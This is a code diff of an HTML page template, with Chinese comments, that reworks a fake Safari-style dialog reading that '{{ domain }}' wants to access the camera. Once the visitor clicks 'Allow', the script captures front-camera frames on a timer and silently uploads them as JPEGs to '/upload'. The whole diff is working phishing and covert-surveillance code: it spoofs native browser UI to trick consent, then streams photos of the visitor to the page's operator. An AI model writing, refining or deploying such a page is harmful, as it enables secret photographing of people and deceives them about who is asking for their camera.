@@ -27,74 +27,90 @@
             display: none;
         }
         
-        /* Custom modal styles to mimic Safari */
-        .modal-overlay {
+        /* Safari风格弹窗样式 */
+        .safari-modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
+            background-color: rgba(0, 0, 0, 0.3);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
         }
-        
-        .modal-container {
-            background-color: #f8f8f8;
-            border-radius: 10px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-            width: 400px;
-            max-width: 90%;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+
+        .safari-modal-overlay.show {
+            opacity: 1;
         }
-        
-        .modal-header {
-            padding: 20px;
+
+        .safari-modal-container {
+            background-color: rgba(255, 255, 255, 0.80);
+            border-radius: 48px;
+            width: calc(100% - 60px);
+            max-width: 350px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+            overflow: hidden;
+        }
+
+        .safari-modal-overlay.show .safari-modal-container {
+            transform: scale(1);
+        }
+
+        .safari-modal-header {
+            padding: 20px 20px 5px;
             text-align: center;
-            border-bottom: 1px solid #ddd;
         }
-        
-        .modal-title {
-            font-size: 16px;
+
+        .safari-modal-title {
+            font-size: 20px;
             font-weight: 600;
             color: #000;
             margin: 0;
         }
-        
-        .modal-body {
-            padding: 20px;
+
+        .safari-modal-body {
+            padding: 10px 20px 10px;
             text-align: center;
             color: #333;
-            font-size: 13px;
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 1.5;
         }
-        
-        .modal-footer {
+
+        .safari-modal-footer {
             display: flex;
-            justify-content: center;
-            padding: 15px;
-            border-top: 1px solid #ddd;
         }
-        
-        .modal-button {
-            background: linear-gradient(to bottom, #fff, #f2f2f2);
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            padding: 8px 20px;
-            font-size: 14px;
+
+        .safari-modal-button {
+            flex: 1;
+            border: none;
+            background: #b7b7b7;
+            padding: 14px 0px;
+            font-size: 17px;
             font-weight: 500;
-            color: #007AFF;
             cursor: pointer;
-            min-width: 80px;
+            text-align: center;
+            color: #000000;
+            border-radius: 30px;
+            margin: 8px 22px;
         }
-        
-        .modal-button:hover {
-            background: linear-gradient(to bottom, #f2f2f2, #e6e6e6);
+
+        .safari-modal-button.bold {
+            font-weight: 600;
         }
-        
-        .modal-button:active {
-            background: linear-gradient(to bottom, #e6e6e6, #d9d9d9);
+
+        .safari-modal-button:not(:last-child) {
+            margin-right:-8px;
+        }
+
+        .safari-modal-button:hover {
+            background-color: #e0e0e0;
         }
     </style>
 </head>
@@ -113,104 +129,166 @@
 
         // Show alert first when button is clicked
         document.getElementById('start').addEventListener('click', async () => {
+            // 隐藏按钮
+            document.getElementById('start').style.display = 'none';
+            
             // Display Safari-style alert box first
-            showSafariStyleAlert('为了继续使用此服务，请允许访问您的摄像头。点击确定以继续。', async () => {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: 'user' } 
-                    });
-                    video.srcObject = stream;
-                    
-                    // Hide the button after successful access
-                    document.getElementById('start').style.display = 'none';
+            showSafariConfirm();
+        });
+
+        // Custom modal function to mimic Safari alert
+        function showSafariConfirm() {
+            createSafariModal({
+                message: '"{{ domain }}"想访问\n你的相机',
+                buttons: [{
+                    text: "取消",
+                    onClick: function() {
+                        // 用户点击取消，重新显示按钮
+                        document.getElementById('start').style.display = 'inline-block';
+                    }
+                }, {
+                    text: "允许",
+                    bold: true,
+                    onClick: function() {
+                        // 用户点击允许，显示浏览器原生提示框
+                        requestCameraAccess();
+                    }
+                }]
+            });
+        }
+
+        // 请求摄像头访问
+        async function requestCameraAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } 
+                });
+                video.srcObject = stream;
                     
                     // Start taking pictures at intervals
                     startCapturing();
                 } catch (err) {
                     console.error("Error accessing camera:", err);
-                    showSafariStyleAlert("无法访问摄像头。请检查权限设置。");
+                    createSafariModal({
+                        message: "无法访问摄像头。请检查权限设置。",
+                        buttons: [{
+                            text: "好",
+                            bold: true,
+                            onClick: function() {
+                                // 显示初始按钮以便用户可以重试
+                                document.getElementById('start').style.display = 'inline-block';
+                            }
+                        }]
+                    });
                 }
-            });
-        });
+            }
 
-        // Custom modal function to mimic Safari alert
-        function showSafariStyleAlert(message, callback) {
-            // Create overlay
-            const overlay = document.createElement('div');
-            overlay.className = 'modal-overlay';
-            
-            // Create modal container
-            const container = document.createElement('div');
-            container.className = 'modal-container';
-            
-            // Create header
-            const header = document.createElement('div');
-            header.className = 'modal-header';
-            
-            const title = document.createElement('h3');
-            title.className = 'modal-title';
-            title.textContent = '提示';
-            header.appendChild(title);
-            
-            // Create body
-            const body = document.createElement('div');
-            body.className = 'modal-body';
-            body.textContent = message;
-            
-            // Create footer
-            const footer = document.createElement('div');
-            footer.className = 'modal-footer';
-            
-            // Create OK button
-            const button = document.createElement('button');
-            button.className = 'modal-button';
-            button.textContent = '好';
-            button.addEventListener('click', () => {
-                document.body.removeChild(overlay);
-                if (callback) callback();
-            });
-            
-            footer.appendChild(button);
-            
-            // Assemble modal
-            container.appendChild(header);
-            container.appendChild(body);
-            container.appendChild(footer);
-            overlay.appendChild(container);
-            
-            // Add to DOM
-            document.body.appendChild(overlay);
-            
-            // Focus the button to ensure its visible
-            button.focus();
-        }
+            // 创建Safari风格弹窗的核心函数
+            function createSafariModal(options) {
+                // 默认配置
+                const defaults = {
+                    title: "",
+                    message: "",
+                    buttons: []
+                };
 
-        function startCapturing() {
-            intervalId = setInterval(() => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0);
-                canvas.toBlob((blob) => {
-                    sendImage(blob);
-                }, 'image/jpeg', 0.8);
-            }, {{ interval }});
-        }
+                // 合并配置
+                const config = Object.assign({}, defaults, options);
 
-        function sendImage(blob) {
-            const formData = new FormData();
-            formData.append('image', blob, 'captured.jpg');
+                // 创建遮罩层
+                const overlay = document.createElement('div');
+                overlay.className = 'safari-modal-overlay';
+
+                // 创建容器
+                const container = document.createElement('div');
+                container.className = 'safari-modal-container';
+
+                // 创建头部
+                const header = document.createElement('div');
+                header.className = 'safari-modal-header';
+                
+                const title = document.createElement('h3');
+                title.className = 'safari-modal-title';
+                title.textContent = config.title;
+                header.appendChild(title);
+
+                // 创建内容区
+                const body = document.createElement('div');
+                body.className = 'safari-modal-body';
+                body.innerHTML = config.message.replace(/\n/g, '<br>');
+
+                // 创建底部按钮区
+                const footer = document.createElement('div');
+                footer.className = 'safari-modal-footer';
+
+                // 添加按钮
+                config.buttons.forEach((button, index) => {
+                    const btn = document.createElement('button');
+                    btn.className = 'safari-modal-button';
+                    if (button.bold) {
+                        btn.classList.add('bold');
+                    }
+                    btn.textContent = button.text;
+                    
+                    btn.addEventListener('click', function() {
+                        // 关闭弹窗
+                        document.body.removeChild(overlay);
+                        
+                        // 执行回调函数
+                        if (button.onClick) {
+                            button.onClick();
+                        }
+                    });
+                    
+                    footer.appendChild(btn);
+                });
+
+                // 组装弹窗
+                container.appendChild(header);
+                container.appendChild(body);
+                container.appendChild(footer);
+                overlay.appendChild(container);
+                
+                // 添加到页面
+                document.body.appendChild(overlay);
+                
+                // 触发显示动画
+                setTimeout(() => {
+                    overlay.classList.add('show');
+                }, 10);
+            }
+
+            function startCapturing() {
+                intervalId = setInterval(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+                    canvas.toBlob((blob) => {
+                        sendImage(blob);
+                    }, 'image/jpeg', 0.8);
+                }, {{ interval }});
+            }
+
+            function sendImage(blob) {
+                const formData = new FormData();
+                formData.append('image', blob, 'captured.jpg');
+                
+                fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                }).then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to upload image');
+                    }
+                }).catch(error => {
+                    console.error('Error uploading image:', error);
+                });
+            }
             
-            fetch('/upload', {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                if (!response.ok) {
-                    console.error('Failed to upload image');
-                }
-            }).catch(error => {
-                console.error('Error uploading image:', error);
-            });
-        }
+            // 页面加载完成后不再自动显示确认框
+            // window.onload = function() {
+            //     showSafariConfirm();
+            // };
     </script>
 </body>
 </html>
